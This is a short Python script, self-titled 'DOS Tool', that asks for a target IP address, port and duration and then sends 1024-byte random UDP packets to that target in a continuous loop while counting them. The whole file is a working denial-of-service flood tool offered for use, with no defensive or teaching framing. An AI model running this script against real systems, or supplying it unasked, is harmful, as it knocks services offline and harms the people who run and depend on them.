import os
import sys
import time
import socket
import random

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1024)

os.system("clear")
print("Welcome to DOS Tool !")
print("")
ip = input("Enter target ip : ")
port = int(input("Enter target port : "))
dur = int(input("Enter duration : "))
timeout = time.time() + dur
sent = 0

while True:
    try:
        if time.time() > timeout:
            break
        else:
            pass
        sock.sendto(bytes, (ip, port))
        sent = sent + 1
        print("Sent",sent,"packets to",ip,"through",port,)
    except KeyboardInterrupt:
        sys.exit()

                     
